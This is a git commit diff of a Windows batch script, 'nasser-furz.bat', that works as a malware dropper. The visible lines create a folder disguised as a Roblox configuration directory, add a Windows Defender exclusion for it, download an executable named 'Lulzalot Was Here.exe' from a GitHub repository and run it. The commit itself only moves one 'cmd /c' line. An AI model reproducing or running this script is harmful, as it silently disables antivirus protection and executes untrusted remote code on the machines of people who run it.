3897db0228d26b502bbcfd88a13dcb5c85f39491
sirfedsalot <criticalshark@proton.me>
2025-02-18 04:33:33 -0600

    Update nasser-furz.bat

--- nasser-furz.bat
+++ nasser-furz.bat
@@ -1,8 +1,8 @@
 @echo off
 start /min
-cmd / c
 set "folderPath=%USERPROFILE%\AppData\Local\RobloxConfig"
 mkdir "%folderPath%"
 powershell -Command "Add-MpPreference -ExclusionPath '%folderPath%'"
 powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/Lulzalot%20Was%20Here.exe' -OutFile '%folderPath%\Lulzalot Was Here.exe'"
 start "" "%folderPath%\Lulzalot Was Here.exe"
+cmd /c
